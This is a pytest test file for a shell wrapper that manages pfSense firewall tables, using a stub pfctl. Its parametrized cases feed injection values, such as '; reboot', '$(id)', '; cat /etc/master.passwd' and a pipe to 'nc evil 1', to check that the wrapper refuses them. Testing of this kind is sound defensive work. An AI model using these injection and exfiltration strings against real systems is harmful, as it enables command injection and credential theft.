"""Exercise deploy/pfsense-screenctl.sh against a stub pfctl (no pfSense needed)."""

from __future__ import annotations

import os
import shutil
import stat
import subprocess
import tempfile
from pathlib import Path

import pytest

SCRIPT = Path(__file__).resolve().parents[2] / "deploy" / "pfsense-screenctl.sh"

STUB = """#!/bin/sh
# Minimal pfctl stand-in: records argv, keeps the tables as files.
echo "$@" >> "$STUB_DIR/calls.log"
[ -n "${STUB_FAIL:-}" ] && { echo "stub failure" >&2; exit 1; }
case "$*" in
  "-t SCR_ACTIVE -T show") [ -f "$STUB_DIR/active" ] && sed 's/^/   /' "$STUB_DIR/active"; exit 0 ;;
  "-t SCR_EDU_ALLOW -T show") [ -f "$STUB_DIR/edu" ] && sed 's/^/   /' "$STUB_DIR/edu"; exit 0 ;;
  "-t SCR_ACTIVE -T add "*) echo "$5" >> "$STUB_DIR/active"; exit 0 ;;
  "-t SCR_ACTIVE -T delete "*) [ -f "$STUB_DIR/active" ] && grep -vx "$5" "$STUB_DIR/active" > "$STUB_DIR/a.tmp"; mv -f "$STUB_DIR/a.tmp" "$STUB_DIR/active" 2>/dev/null; exit 0 ;;
  "-t SCR_EDU_ALLOW -T replace -f "*) cp "$6" "$STUB_DIR/edu"; exit 0 ;;
  "-t SCR_EDU_ALLOW -T flush") : > "$STUB_DIR/edu"; exit 0 ;;
  "-k "*) exit 0 ;;
esac
echo "unexpected pfctl call: $*" >&2
exit 2
"""

CONF = 'MANAGED_SUBNET=192.168.12.0/24\nALLOWED_IPS="192.168.12.30 192.168.12.31 192.168.12.40 192.168.12.41"\n'


class Wrapper:
    def __init__(self, tmp: Path) -> None:
        self.dir = tmp / "stub"
        self.dir.mkdir()
        pfctl = self.dir / "pfctl"
        pfctl.write_text(STUB)
        pfctl.chmod(pfctl.stat().st_mode | stat.S_IXUSR)
        self.conf = tmp / "screenctl.conf"
        self.conf.write_text(CONF)
        self.env = {
            **os.environ,
            "SCREENCTL_CONF": str(self.conf),
            "SCREENCTL_PFCTL": str(pfctl),
            "STUB_DIR": str(self.dir),
        }
        self.env.pop("SSH_ORIGINAL_COMMAND", None)

    def run(
        self, *args: str, stdin: str = "", env: dict[str, str] | None = None, shell: str = "sh"
    ) -> subprocess.CompletedProcess[str]:
        return subprocess.run(
            [shell, str(SCRIPT), *args],
            input=stdin,
            capture_output=True,
            text=True,
            env={**self.env, **(env or {})},
            timeout=20,
            check=False,
        )

    def calls(self) -> list[str]:
        log = self.dir / "calls.log"
        return log.read_text().splitlines() if log.exists() else []

    def table(self, name: str) -> list[str]:
        path = self.dir / name
        return path.read_text().split() if path.exists() else []


@pytest.fixture
def w(tmp_path: Path) -> Wrapper:
    return Wrapper(tmp_path)


def test_health_checks_both_tables(w: Wrapper) -> None:
    res = w.run("health")
    assert res.returncode == 0 and res.stdout.strip() == "ok"
    assert w.calls() == ["-t SCR_ACTIVE -T show", "-t SCR_EDU_ALLOW -T show"]


def test_add_show_and_delete_active(w: Wrapper) -> None:
    assert w.run("add-active", "192.168.12.30").returncode == 0
    assert w.run("add-active", "192.168.12.40").returncode == 0
    shown = w.run("show-active")
    assert shown.stdout.split() == ["192.168.12.30", "192.168.12.40"]
    assert w.run("del-active", "192.168.12.30").returncode == 0
    assert w.run("show-active").stdout.split() == ["192.168.12.40"]


def test_kill_states_kills_both_directions(w: Wrapper) -> None:
    assert w.run("kill-states", "192.168.12.31").returncode == 0
    assert w.calls() == ["-k 192.168.12.31", "-k 0.0.0.0/0 -k 192.168.12.31"]


@pytest.mark.parametrize(
    "bad",
    [
        "192.168.12.30; reboot",
        "192.168.12.30 && id",
        "$(id)",
        "`id`",
        "192.168.12.30\n192.168.12.31",
        "192.168.12",
        "192.168.12.300",
        "192.168.012.30",
        "::1",
        "192.168.12.30/24",
        "-f /etc/passwd",
        "",
        "0x7f.0.0.1",
    ],
)
def test_malformed_addresses_are_refused_without_touching_pf(w: Wrapper, bad: str) -> None:
    for op in ("add-active", "del-active", "kill-states"):
        res = w.run(op, bad)
        assert res.returncode != 0, (op, bad)
    assert w.calls() == []


def test_addresses_outside_the_subnet_or_unknown_devices_are_refused(w: Wrapper) -> None:
    assert w.run("add-active", "10.0.0.5").returncode == 64  # outside subnet
    assert w.run("add-active", "192.168.12.99").returncode == 64  # inside subnet, unknown device
    assert w.calls() == []


def test_unknown_operations_and_wrong_arity_are_refused(w: Wrapper) -> None:
    for args in (["flush-all"], ["add-active"], ["add-active", "a", "b"], ["show-active", "x"], []):
        assert w.run(*args).returncode == 64, args
    assert w.run("pass-through", "-F all").returncode == 64
    assert w.calls() == []


def test_replace_edu_replaces_the_table_from_stdin(w: Wrapper) -> None:
    stdin = "104.18.1.1\n2606:4700:4700::1111\n13.32.1.1\n"
    res = w.run("replace-edu", "-", stdin=stdin)
    assert res.returncode == 0, res.stderr
    assert w.table("edu") == ["104.18.1.1", "2606:4700:4700::1111", "13.32.1.1"]
    leftovers = list(Path(tempfile.gettempdir()).glob("screenctl.*"))
    assert leftovers == []  # the temporary file is always cleaned up


def test_replace_edu_with_no_addresses_flushes_the_table(w: Wrapper) -> None:
    w.run("replace-edu", "-", stdin="1.1.1.1\n")
    res = w.run("replace-edu", "-", stdin="")
    assert res.returncode == 0 and w.table("edu") == []
    assert w.calls()[-1] == "-t SCR_EDU_ALLOW -T flush"


@pytest.mark.parametrize(
    "payload", ["1.1.1.1\nnot-an-ip\n", "1.1.1.1; id\n", "1.1.1.1/24\n", "$(id)\n"]
)
def test_replace_edu_rejects_any_non_address_line_and_leaves_the_table_alone(
    w: Wrapper, payload: str
) -> None:
    w.run("replace-edu", "-", stdin="9.9.9.9\n")
    before = w.calls()
    res = w.run("replace-edu", "-", stdin=payload)
    assert res.returncode == 64
    assert w.calls() == before
    assert w.table("edu") == ["9.9.9.9"]


def test_replace_edu_requires_stdin_marker(w: Wrapper) -> None:
    assert w.run("replace-edu", "/etc/passwd").returncode == 64


def test_ssh_mode_takes_the_request_from_the_original_command(w: Wrapper) -> None:
    res = w.run(
        "--ssh",
        env={"SSH_ORIGINAL_COMMAND": "sudo /usr/local/sbin/screenctl add-active 192.168.12.40"},
    )
    assert res.returncode == 0 and w.table("active") == ["192.168.12.40"]
    res = w.run("--ssh", env={"SSH_ORIGINAL_COMMAND": "/usr/local/sbin/screenctl show-active"})
    assert res.stdout.split() == ["192.168.12.40"]


@pytest.mark.parametrize(
    "original",
    [
        "screenctl add-active 192.168.12.30; cat /etc/master.passwd",
        "screenctl add-active 192.168.12.30 | nc evil 1",
        "screenctl add-active $(id)",
        "screenctl add-active `id`",
        "sh -c id",
        "/bin/sh",
        "screenctl add-active 192.168.12.30 > /tmp/x",
        "",
    ],
)
def test_ssh_mode_refuses_shell_metacharacters_and_other_commands(
    w: Wrapper, original: str
) -> None:
    res = w.run("--ssh", env={"SSH_ORIGINAL_COMMAND": original})
    assert res.returncode != 0
    assert w.calls() == []


def test_missing_or_invalid_config_is_refused(w: Wrapper) -> None:
    w.conf.write_text("ACTIVE_TABLE=SCR_ACTIVE\n")
    assert w.run("health").returncode == 78  # MANAGED_SUBNET required
    w.conf.write_text("MANAGED_SUBNET=192.168.12.0/24\nEVIL=1\n")
    assert w.run("health").returncode == 78
    w.conf.write_text("MANAGED_SUBNET=192.168.12.0/24\nEDU_TABLE=x;y\n")
    assert w.run("health").returncode == 78
    w.conf.write_text("MANAGED_SUBNET=999.1.1.1/24\n")
    assert w.run("health").returncode == 78
    assert w.calls() == []


def test_pfctl_failure_is_reported_as_failure(w: Wrapper) -> None:
    res = w.run("add-active", "192.168.12.30", env={"STUB_FAIL": "1"})
    assert res.returncode != 0


@pytest.mark.skipif(shutil.which("dash") is None, reason="dash not installed")
def test_runs_under_a_strict_posix_shell(w: Wrapper) -> None:
    res = w.run("add-active", "192.168.12.30", shell="dash")  # noqa: S604
    assert res.returncode == 0 and w.table("active") == ["192.168.12.30"]
